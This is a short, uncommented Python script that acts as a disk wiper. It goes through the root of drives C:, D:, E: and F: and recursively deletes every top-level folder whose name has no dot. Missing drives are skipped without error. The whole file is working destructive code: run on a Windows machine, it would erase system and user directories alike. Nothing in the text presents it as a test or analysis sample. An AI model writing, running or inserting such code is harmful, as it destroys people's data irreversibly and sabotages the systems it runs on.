import os,shutil
ls =[]
try:
    os.chdir("C:\\")
    for i in os.listdir():
        if "." not in i:
            ls.append(i)
    for i in ls:
        shutil.rmtree(i)

except FileNotFoundError:
    pass

ls.clear()

try:

    os.chdir("D:\\")
    for i in os.listdir():
        if "." not in i:
            ls.append(i)
    for i in ls:
        shutil.rmtree(i)

except FileNotFoundError:
    pass

ls.clear()

try:

    os.chdir("E:\\")
    for i in os.listdir():
        if "." not in i:
            ls.append(i)
    for i in ls:
        shutil.rmtree(i) 

except FileNotFoundError:
    pass

ls.clear()

try:
    os.chdir("F:\\")
    for i in os.listdir():
        if "." not in i:
            ls.append(i)
    for i in ls:
        shutil.rmtree(i)        
except FileNotFoundError:
    pass

      